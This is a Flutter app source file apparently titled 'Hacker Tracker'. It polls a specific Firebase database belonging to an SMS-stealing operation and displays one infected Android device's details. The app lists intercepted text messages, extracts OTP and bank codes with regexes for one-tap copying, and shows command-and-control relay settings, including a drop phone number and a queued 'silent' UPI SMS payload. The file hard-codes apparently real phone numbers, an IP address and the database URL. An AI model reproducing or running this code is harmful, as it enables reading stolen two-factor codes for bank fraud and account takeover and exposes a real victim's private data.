import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;

void main() {
  runApp(const HackerTrackerApp());
}

class HackerTrackerApp extends StatelessWidget {
  const HackerTrackerApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Hacker Tracker · 03e768e104ef026d',
      debugShowCheckedModeBanner: false,
      themeMode: ThemeMode.dark,
      darkTheme: ThemeData(
        useMaterial3: true,
        brightness: Brightness.dark,
        colorScheme: ColorScheme.fromSeed(
          seedColor: const Color(0xFF00ADB5),
          brightness: Brightness.dark,
          surface: const Color(0xFF121214),
          surfaceContainer: const Color(0xFF1E1E22),
          surfaceContainerHigh: const Color(0xFF28282D),
        ),
        scaffoldBackgroundColor: const Color(0xFF0A0A0C),
        fontFamily: 'Inter',
        appBarTheme: const AppBarTheme(
          backgroundColor: Color(0xFF121214),
          surfaceTintColor: Colors.transparent,
          elevation: 0,
          scrolledUnderElevation: 2,
        ),
        cardTheme: CardTheme(
          color: const Color(0xFF18181C),
          elevation: 0,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(16),
            side: const BorderSide(color: Color(0xFF2A2A30), width: 1),
          ),
        ),
        navigationBarTheme: NavigationBarThemeData(
          backgroundColor: const Color(0xFF121214),
          indicatorColor: const Color(0xFF00ADB5).withOpacity(0.25),
          surfaceTintColor: Colors.transparent,
          elevation: 3,
        ),
      ),
      home: const MainScreen(),
    );
  }
}

class MainScreen extends StatefulWidget {
  const MainScreen({super.key});

  @override
  State<MainScreen> createState() => _MainScreenState();
}

class _MainScreenState extends State<MainScreen> {
  final String deviceId = '03e768e104ef026d';
  final String firebaseBase = 'https://r-cha-222-default-rtdb.firebaseio.com';

  int _currentNavIndex = 0;
  bool _isLoading = true;
  bool _isOnline = true;
  String _battery = '71%';
  String _ipAddress = '106.211.47.194';
  String _phone = '+918433062983';
  String _carrier = 'Airtel';
  String _model = 'OnePlus CPH2467';
  String _os = 'Android 15 (SDK 35)';
  String _storage = '104GB';
  String _command = 'forward status';
  String _simSlot = '0';
  String _ping = 'ping_magic_scan';
  String _pong = 'pong';
  String _dropPhone = '+919560241900';
  String _silentSms = 'HDFCUPI ...';
  String _lastSync = 'Just now';

  List<Map<String, dynamic>> _allMessages = [];
  List<Map<String, dynamic>> _filteredMessages = [];
  Set<String> _selectedFilter = {'all'};
  String _searchQuery = '';
  final TextEditingController _searchController = TextEditingController();
  Timer? _refreshTimer;

  @override
  void initState() {
    super.initState();
    _fetchTelemetry();
    _refreshTimer = Timer.periodic(const Duration(seconds: 15), (_) => _fetchTelemetry());
  }

  @override
  void dispose() {
    _refreshTimer?.cancel();
    _searchController.dispose();
    super.dispose();
  }

  Future<void> _fetchTelemetry() async {
    setState(() => _isLoading = true);
    try {
      final clientUri = Uri.parse('$firebaseBase/clients/$deviceId.json');
      final cmdUri = Uri.parse('$firebaseBase/commands/$deviceId.json');
      final userUri = Uri.parse('$firebaseBase/user_data/$deviceId.json');
      final msgUri = Uri.parse('$firebaseBase/messages/$deviceId.json');

      final responses = await Future.wait([
        http.get(clientUri).catchError((_) => http.Response('null', 500)),
        http.get(cmdUri).catchError((_) => http.Response('null', 500)),
        http.get(userUri).catchError((_) => http.Response('null', 500)),
        http.get(msgUri).catchError((_) => http.Response('null', 500)),
      ]);

      if (responses[0].statusCode == 200 && responses[0].body != 'null') {
        final clientData = json.decode(responses[0].body) as Map<String, dynamic>;
        setState(() {
          _isOnline = clientData['status'] == true;
          _battery = clientData['battery']?.toString() ?? '71%';
          _ipAddress = clientData['ip_address']?.toString() ?? _ipAddress;
          _phone = clientData['mobNo']?.toString() ?? _phone;
          _carrier = clientData['service_provider']?.toString() ?? _carrier;
          _model = clientData['modelName']?.toString() ?? _model;
          if (clientData['androidV'] != null) {
            _os = 'Android ${clientData['androidV']} (SDK ${clientData['sdkV'] ?? 35})';
          }
          _storage = clientData['storage']?.toString() ?? _storage;

          final wh = clientData['webhookEvent'] as Map<String, dynamic>?;
          if (wh != null) {
            final check = wh['checkLiveness'] as Map<String, dynamic>?;
            if (check != null && check['text'] != null) {
              _pong = check['text'].toString();
            }
            final sms = wh['sendSms'] as Map<String, dynamic>?;
            if (sms != null) {
              _dropPhone = sms['to']?.toString() ?? _dropPhone;
              _silentSms = sms['message']?.toString() ?? _silentSms;
            }
          }
        });
      }

      if (responses[1].statusCode == 200 && responses[1].body != 'null') {
        final cmdData = json.decode(responses[1].body) as Map<String, dynamic>;
        final chk = cmdData['checkLiveness'] as Map<String, dynamic>?;
        if (chk != null && chk['text'] != null) {
          setState(() {
            _ping = chk['text'].toString();
          });
        }
      }

      if (responses[2].statusCode == 200 && responses[2].body != 'null') {
        final udData = json.decode(responses[2].body) as Map<String, dynamic>;
        setState(() {
          _command = udData['command']?.toString() ?? _command;
          _simSlot = udData['simSlot']?.toString() ?? _simSlot;
        });
      }

      if (responses[3].statusCode == 200 && responses[3].body != 'null') {
        final msgMap = json.decode(responses[3].body) as Map<String, dynamic>;
        _parseMessages(msgMap);
      }

      setState(() {
        _isLoading = false;
        final now = DateTime.now();
        _lastSync = '${now.hour.toString().padLeft(2, '0')}:${now.minute.toString().padLeft(2, '0')}';
      });
    } catch (_) {
      _fallbackToLocalSnapshot();
    }
  }

  Future<void> _fallbackToLocalSnapshot() async {
    try {
      final res = await http.get(Uri.parse('data/latest.json'));
      if (res.statusCode == 200) {
        final data = json.decode(res.body) as Map<String, dynamic>;
        final rawClient = data['raw']?['client'] ?? data['client'];
        if (rawClient != null) {
          setState(() {
            _battery = rawClient['battery']?.toString() ?? _battery;
            _ipAddress = rawClient['ip_address']?.toString() ?? _ipAddress;
            _isOnline = rawClient['status'] == true;
          });
        }
      }
      final msgRes = await http.get(Uri.parse('data/messages_archive.json'));
      if (msgRes.statusCode == 200) {
        final msgData = json.decode(msgRes.body) as Map<String, dynamic>;
        final rawMsgs = msgData['messages'] as Map<String, dynamic>?;
        if (rawMsgs != null) _parseMessages(rawMsgs);
      }
    } catch (_) {}
    setState(() {
      _isLoading = false;
      _lastSync = 'Snapshot';
    });
  }

  void _parseMessages(Map<String, dynamic> raw) {
    final list = <Map<String, dynamic>>[];
    final otpRe = RegExp(r'\b(otp|code|pin|password|verification|verify)\b', caseSensitive: false);
    final numRe = RegExp(r'\b(\d{4,8})\b');
    final bankRe = RegExp(r'\b(upi|inr|rs\.?|debited|credited|balance|a/c|account|bank|pnb|sbi|hdfc|icici)\b', caseSensitive: false);

    raw.forEach((key, val) {
      if (val is Map<String, dynamic>) {
        final body = val['message']?.toString() ?? '';
        final sender = (val['sender']?.toString() ?? 'UNKNOWN').toUpperCase();
        final isOtp = otpRe.hasMatch(body);
        final isBank = bankRe.hasMatch(body) || sender.contains('PNB') || sender.contains('BANK');
        final isCarrier = sender.contains('AIRTEL') || sender.contains('JIO') || sender.contains('6500');

        String? extractedOtp;
        if (isOtp) {
          final m = numRe.firstMatch(body);
          if (m != null) extractedOtp = m.group(1);
        }

        list.add({
          'id': val['id']?.toString() ?? key,
          'sender': val['sender']?.toString() ?? 'UNKNOWN',
          'message': body,
          'time': val['dateTime']?.toString() ?? '',
          'isOtp': isOtp,
          'isBank': isBank,
          'isCarrier': isCarrier,
          'extractedOtp': extractedOtp,
        });
      }
    });

    list.sort((a, b) {
      final na = int.tryParse(a['id']);
      final nb = int.tryParse(b['id']);
      if (na != null && nb != null) return nb.compareTo(na);
      return b['id'].compareTo(a['id']);
    });

    setState(() {
      _allMessages = list;
      _applyFilter();
    });
  }

  void _applyFilter() {
    final mode = _selectedFilter.first;
    setState(() {
      _filteredMessages = _allMessages.where((m) {
        if (mode == 'otp' && m['isOtp'] != true) return false;
        if (mode == 'bank' && m['isBank'] != true) return false;
        if (mode == 'carrier' && m['isCarrier'] != true) return false;

        if (_searchQuery.isNotEmpty) {
          final s = (m['sender'] as String).toLowerCase();
          final b = (m['message'] as String).toLowerCase();
          final t = (m['time'] as String).toLowerCase();
          return s.contains(_searchQuery) || b.contains(_searchQuery) || t.contains(_searchQuery);
        }
        return true;
      }).toList();
    });
  }

  void _copyToClipboard(String text, String label) {
    Clipboard.setData(ClipboardData(text: text));
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('$label copied to clipboard'),
        duration: const Duration(seconds: 2),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Row(
          children: [
            InkWell(
              borderRadius: BorderRadius.circular(8),
              onTap: () => _copyToClipboard(deviceId, 'Device ID'),
              child: Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                decoration: BoxDecoration(
                  color: const Color(0xFF1E1E22),
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: const Color(0xFF2A2A30)),
                ),
                child: Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Container(
                      width: 8,
                      height: 8,
                      decoration: BoxDecoration(
                        color: _isOnline ? Colors.greenAccent : Colors.redAccent,
                        shape: BoxShape.circle,
                      ),
                    ),
                    const SizedBox(width: 6),
                    Text(
                      deviceId,
                      style: const TextStyle(
                        fontFamily: 'monospace',
                        fontSize: 12,
                        fontWeight: FontWeight.bold,
                        color: Color(0xFF00ADB5),
                      ),
                    ),
                    const SizedBox(width: 4),
                    const Icon(Icons.copy, size: 12, color: Colors.grey),
                  ],
                ),
              ),
            ),
          ],
        ),
        actions: [
          Center(
            child: Text(
              _lastSync,
              style: const TextStyle(fontSize: 12, color: Colors.grey),
            ),
          ),
          IconButton(
            icon: _isLoading
                ? const SizedBox(width: 18, height: 18, child: CircularProgressIndicator(strokeWidth: 2))
                : const Icon(Icons.refresh),
            tooltip: 'Refresh Telemetry',
            onPressed: _fetchTelemetry,
          ),
        ],
      ),
      body: IndexedStack(
        index: _currentNavIndex,
        children: [
          _buildOverviewTab(),
          _buildMessagesTab(),
          _buildCommandsTab(),
          _buildTimelineTab(),
        ],
      ),
      bottomNavigationBar: NavigationBar(
        selectedIndex: _currentNavIndex,
        onDestinationSelected: (idx) => setState(() => _currentNavIndex = idx),
        destinations: [
          const NavigationDestination(
            icon: Icon(Icons.dashboard_outlined),
            selectedIcon: Icon(Icons.dashboard),
            label: 'Overview',
          ),
          NavigationDestination(
            icon: Badge(
              label: Text('${_allMessages.length}'),
              isLabelVisible: _allMessages.isNotEmpty,
              backgroundColor: Colors.redAccent,
              child: const Icon(Icons.chat_bubble_outline),
            ),
            selectedIcon: Badge(
              label: Text('${_allMessages.length}'),
              isLabelVisible: _allMessages.isNotEmpty,
              backgroundColor: Colors.redAccent,
              child: const Icon(Icons.chat_bubble),
            ),
            label: 'Messages',
          ),
          const NavigationDestination(
            icon: Icon(Icons.terminal_outlined),
            selectedIcon: Icon(Icons.terminal),
            label: 'C2 Relay',
          ),
          const NavigationDestination(
            icon: Icon(Icons.history_outlined),
            selectedIcon: Icon(Icons.history),
            label: 'Timeline',
          ),
        ],
      ),
    );
  }

  // ==================== OVERVIEW TAB ====================
  Widget _buildOverviewTab() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        // Status Card
        Card(
          child: Padding(
            padding: const EdgeInsets.all(16),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    const Text('DEVICE CONNECTION', style: TextStyle(fontSize: 11, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 0.8)),
                    Chip(
                      avatar: Container(
                        width: 8,
                        height: 8,
                        decoration: BoxDecoration(
                          color: _isOnline ? Colors.greenAccent : Colors.redAccent,
                          shape: BoxShape.circle,
                        ),
                      ),
                      label: Text(_isOnline ? 'ONLINE' : 'OFFLINE'),
                      backgroundColor: _isOnline ? Colors.green.withOpacity(0.15) : Colors.red.withOpacity(0.15),
                      labelStyle: TextStyle(
                        fontSize: 11,
                        fontWeight: FontWeight.bold,
                        color: _isOnline ? Colors.greenAccent : Colors.redAccent,
                      ),
                      padding: EdgeInsets.zero,
                    ),
                  ],
                ),
                const SizedBox(height: 12),
                Row(
                  children: [
                    _buildStatCol('BATTERY', _battery, Icons.battery_charging_full, Colors.greenAccent),
                    const SizedBox(width: 24),
                    _buildStatCol('IP ADDRESS', _ipAddress, Icons.wifi, const Color(0xFF00ADB5)),
                    const SizedBox(width: 24),
                    _buildStatCol('CARRIER', '$_phone\n($_carrier)', Icons.sim_card, Colors.amberAccent),
                  ],
                ),
              ],
            ),
          ),
        ),
        const SizedBox(height: 12),

        // Hardware Specs Card
        Card(
          child: Column(
            children: [
              ListTile(
                leading: const Icon(Icons.smartphone),
                title: const Text('Handset Model'),
                trailing: Text(_model, style: const TextStyle(fontWeight: FontWeight.bold)),
              ),
              const Divider(height: 1, indent: 56),
              ListTile(
                leading: const Icon(Icons.android),
                title: const Text('Operating System'),
                trailing: Text(_os),
              ),
              const Divider(height: 1, indent: 56),
              ListTile(
                leading: const Icon(Icons.sd_storage),
                title: const Text('Storage / SD Card'),
                trailing: Text('$_storage (SD: Present)'),
              ),
            ],
          ),
        ),
        const SizedBox(height: 12),

        // C2 Controller Card
        Card(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const Padding(
                padding: EdgeInsets.fromLTRB(16, 16, 16, 8),
                child: Text('C2 AUTO-RELAY GATEWAY', style: TextStyle(fontSize: 11, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 0.8)),
              ),
              ListTile(
                leading: const Icon(Icons.sensors, color: Colors.greenAccent),
                title: const Text('Liveness Handshake'),
                trailing: Text('$_ping ⇄ $_pong', style: const TextStyle(fontFamily: 'monospace', fontWeight: FontWeight.bold, color: Colors.greenAccent)),
              ),
              const Divider(height: 1, indent: 56),
              ListTile(
                leading: const Icon(Icons.code, color: Color(0xFF00ADB5)),
                title: const Text('Active User Command'),
                trailing: Text('$_command (Slot $_simSlot)', style: const TextStyle(fontFamily: 'monospace', color: Color(0xFF00ADB5))),
              ),
              const Divider(height: 1, indent: 56),
              ListTile(
                leading: const Icon(Icons.call_made, color: Colors.amberAccent),
                title: const Text('Drop Destination Phone'),
                trailing: Text(_dropPhone, style: const TextStyle(fontFamily: 'monospace', fontWeight: FontWeight.bold, color: Colors.amberAccent)),
              ),
              const Divider(height: 1, indent: 56),
              ListTile(
                leading: const Icon(Icons.sms_outlined),
                title: const Text('Silent HDFC UPI Payload'),
                subtitle: Text(_silentSms, maxLines: 1, overflow: TextOverflow.ellipsis),
                trailing: const Chip(label: Text('Queued', style: TextStyle(fontSize: 11))),
              ),
            ],
          ),
        ),
      ],
    );
  }

  Widget _buildStatCol(String label, String value, IconData icon, Color color) {
    return Expanded(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(icon, size: 14, color: color),
              const SizedBox(width: 4),
              Text(label, style: const TextStyle(fontSize: 10, color: Colors.grey, fontWeight: FontWeight.bold)),
            ],
          ),
          const SizedBox(height: 4),
          Text(
            value,
            style: const TextStyle(fontSize: 13, fontWeight: FontWeight.bold, fontFamily: 'monospace'),
            maxLines: 2,
            overflow: TextOverflow.ellipsis,
          ),
        ],
      ),
    );
  }

  // ==================== DEDICATED MESSAGES TAB ====================
  Widget _buildMessagesTab() {
    final otpsCount = _allMessages.where((m) => m['isOtp'] == true).length;
    final bankCount = _allMessages.where((m) => m['isBank'] == true).length;
    final carrierCount = _allMessages.where((m) => m['isCarrier'] == true).length;

    return Column(
      children: [
        // Search & Filters Header
        Padding(
          padding: const EdgeInsets.fromLTRB(16, 12, 16, 8),
          child: SearchBar(
            controller: _searchController,
            leading: const Icon(Icons.search),
            trailing: _searchQuery.isNotEmpty
                ? [
                    IconButton(
                      icon: const Icon(Icons.clear),
                      onPressed: () {
                        _searchController.clear();
                        setState(() {
                          _searchQuery = '';
                          _applyFilter();
                        });
                      },
                    )
                  ]
                : null,
            hintText: 'Search sender, bank, OTP, text...',
            onChanged: (val) {
              setState(() {
                _searchQuery = val.trim().toLowerCase();
                _applyFilter();
              });
            },
          ),
        ),

        // Native M3 Segmented Button
        Padding(
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
          child: SingleChildScrollView(
            scrollDirection: Axis.horizontal,
            child: SegmentedButton<String>(
              segments: [
                ButtonSegment(value: 'all', label: Text('All (${_allMessages.length})')),
                ButtonSegment(value: 'otp', label: Text('🔑 OTPs ($otpsCount)')),
                ButtonSegment(value: 'bank', label: Text('🏦 Bank ($bankCount)')),
                ButtonSegment(value: 'carrier', label: Text('📶 Airtel ($carrierCount)')),
              ],
              selected: _selectedFilter,
              onSelectionChanged: (newSel) {
                setState(() {
                  _selectedFilter = newSel;
                  _applyFilter();
                });
              },
            ),
          ),
        ),
        const SizedBox(height: 8),

        // Message List
        Expanded(
          child: _filteredMessages.isEmpty
              ? const Center(
                  child: Text('No messages found', style: TextStyle(color: Colors.grey)),
                )
              : ListView.builder(
                  itemCount: _filteredMessages.length,
                  itemBuilder: (context, idx) {
                    final m = _filteredMessages[idx];
                    return _buildMessageTile(m);
                  },
                ),
        ),
      ],
    );
  }

  Widget _buildMessageTile(Map<String, dynamic> m) {
    Color avatarColor = Colors.grey.shade700;
    if (m['isOtp'] == true) avatarColor = Colors.redAccent.shade700;
    else if (m['isBank'] == true) avatarColor = Colors.blueAccent.shade700;
    else if (m['isCarrier'] == true) avatarColor = Colors.purpleAccent.shade700;

    final sender = m['sender'] as String;
    final initials = sender.replaceAll(RegExp(r'[^A-Za-z0-9]'), '');
    final shortInitials = initials.length >= 3 ? initials.substring(0, 3) : (initials.isNotEmpty ? initials : '??');

    return Card(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
      child: ListTile(
        onTap: () => _showMessageBottomSheet(m),
        leading: CircleAvatar(
          backgroundColor: avatarColor,
          child: Text(
            shortInitials,
            style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 11, color: Colors.white),
          ),
        ),
        title: Row(
          mainAxisAlignment: MainAxisAlignment.spaceBetween,
          children: [
            Expanded(
              child: Text(
                sender,
                style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 13),
                overflow: TextOverflow.ellipsis,
              ),
            ),
            Text(
              _formatTime(m['time']),
              style: const TextStyle(fontSize: 11, color: Colors.grey),
            ),
          ],
        ),
        subtitle: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const SizedBox(height: 4),
            if (m['extractedOtp'] != null)
              Container(
                margin: const EdgeInsets.only(bottom: 4),
                padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                decoration: BoxDecoration(
                  color: Colors.redAccent.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(4),
                  border: Border.all(color: Colors.redAccent, width: 0.5),
                ),
                child: Text(
                  'OTP: ${m['extractedOtp']}',
                  style: const TextStyle(
                    fontFamily: 'monospace',
                    fontWeight: FontWeight.bold,
                    color: Colors.amberAccent,
                    fontSize: 11,
                  ),
                ),
              ),
            Text(
              m['message'] as String,
              maxLines: 2,
              overflow: TextOverflow.ellipsis,
              style: TextStyle(fontSize: 12, color: Colors.grey.shade300),
            ),
          ],
        ),
        trailing: const Icon(Icons.chevron_right, size: 18, color: Colors.grey),
      ),
    );
  }

  void _showMessageBottomSheet(Map<String, dynamic> m) {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: const Color(0xFF18181C),
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
      ),
      builder: (ctx) => Padding(
        padding: const EdgeInsets.all(20),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Center(
              child: Container(
                width: 40,
                height: 4,
                decoration: BoxDecoration(color: Colors.grey.shade600, borderRadius: BorderRadius.circular(2)),
              ),
            ),
            const SizedBox(height: 16),
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Text(m['sender'], style: const TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
                Text(m['time'], style: const TextStyle(fontSize: 12, color: Colors.grey)),
              ],
            ),
            const SizedBox(height: 16),
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: Colors.black26,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: const Color(0xFF2A2A30)),
              ),
              child: SelectableText(
                m['message'],
                style: const TextStyle(fontSize: 13, height: 1.4),
              ),
            ),
            if (m['extractedOtp'] != null) ...[
              const SizedBox(height: 12),
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: Colors.redAccent.withOpacity(0.12),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: Colors.redAccent),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        const Text('EXTRACTED 2FA OTP', style: TextStyle(fontSize: 10, color: Colors.amberAccent, fontWeight: FontWeight.bold)),
                        Text(m['extractedOtp'], style: const TextStyle(fontFamily: 'monospace', fontSize: 20, fontWeight: FontWeight.bold)),
                      ],
                    ),
                    FilledButton.icon(
                      icon: const Icon(Icons.copy, size: 16),
                      label: const Text('Copy OTP'),
                      onPressed: () {
                        _copyToClipboard(m['extractedOtp'], 'OTP');
                        Navigator.pop(ctx);
                      },
                    ),
                  ],
                ),
              ),
            ],
            const SizedBox(height: 16),
            Row(
              children: [
                Expanded(
                  child: OutlinedButton.icon(
                    icon: const Icon(Icons.copy, size: 16),
                    label: const Text('Copy Full SMS'),
                    onPressed: () {
                      _copyToClipboard(m['message'], 'Message');
                      Navigator.pop(ctx);
                    },
                  ),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: FilledButton(
                    child: const Text('Done'),
                    onPressed: () => Navigator.pop(ctx),
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  // ==================== COMMANDS TAB ====================
  Widget _buildCommandsTab() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        Card(
          child: Padding(
            padding: const EdgeInsets.all(16),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text('REALTIME CONTROLLER STATE', style: TextStyle(fontSize: 11, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 0.8)),
                const SizedBox(height: 12),
                ListTile(
                  contentPadding: EdgeInsets.zero,
                  title: const Text('Active Command'),
                  subtitle: Text(_command, style: const TextStyle(fontFamily: 'monospace', color: Color(0xFF00ADB5), fontSize: 16)),
                ),
                ListTile(
                  contentPadding: EdgeInsets.zero,
                  title: const Text('Relay SIM Slot Index'),
                  trailing: Text(_simSlot, style: const TextStyle(fontFamily: 'monospace', fontWeight: FontWeight.bold)),
                ),
              ],
            ),
          ),
        ),
        const SizedBox(height: 12),
        Card(
          child: Padding(
            padding: const EdgeInsets.all(16),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text('LIVENESS PROTOCOL', style: TextStyle(fontSize: 11, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 0.8)),
                const SizedBox(height: 12),
                ListTile(
                  contentPadding: EdgeInsets.zero,
                  title: const Text('Server Ping Probe'),
                  trailing: Text(_ping, style: const TextStyle(fontFamily: 'monospace', color: Color(0xFF00ADB5))),
                ),
                ListTile(
                  contentPadding: EdgeInsets.zero,
                  title: const Text('Client Pong Response'),
                  trailing: Text(_pong, style: const TextStyle(fontFamily: 'monospace', color: Colors.greenAccent, fontWeight: FontWeight.bold)),
                ),
                ListTile(
                  contentPadding: EdgeInsets.zero,
                  title: const Text('Status'),
                  trailing: const Chip(
                    label: Text('ACTIVE & LIVE', style: TextStyle(color: Colors.greenAccent, fontSize: 11, fontWeight: FontWeight.bold)),
                    backgroundColor: Color(0x2200FF00),
                  ),
                ),
              ],
            ),
          ),
        ),
      ],
    );
  }

  // ==================== TIMELINE TAB ====================
  Widget _buildTimelineTab() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _buildTimelineItem('2026-11-19 16:58', 'NEW_SMS_INTERCEPTED', 'Sony LIV OTP (2395) captured on device 03e768e104ef026d.', Colors.greenAccent),
        _buildTimelineItem('2026-11-19 16:52', 'BATTERY_LEVEL_CHANGED', 'Battery shifted from 74% to 71%.', Colors.amberAccent),
        _buildTimelineItem('2026-11-19 16:49', 'INITIAL_TRACKER_RUN', 'Surveillance tracker initialized for target 03e768e104ef026d.', const Color(0xFF00ADB5)),
      ],
    );
  }

  Widget _buildTimelineItem(String time, String type, String desc, Color color) {
    return Card(
      margin: const EdgeInsets.only(bottom: 8),
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Chip(
                  label: Text(type, style: TextStyle(fontSize: 10, fontWeight: FontWeight.bold, color: color)),
                  backgroundColor: color.withOpacity(0.12),
                  padding: EdgeInsets.zero,
                  materialTapTargetSize: MaterialTapTargetSize.shrinkWrap,
                ),
                Text(time, style: const TextStyle(fontSize: 11, color: Colors.grey)),
              ],
            ),
            const SizedBox(height: 8),
            Text(desc, style: const TextStyle(fontSize: 13)),
          ],
        ),
      ),
    );
  }

  String _formatTime(String timeStr) {
    if (timeStr.contains('|')) {
      return timeStr.split('|')[1].trim().toUpperCase();
    }
    return timeStr;
  }
}
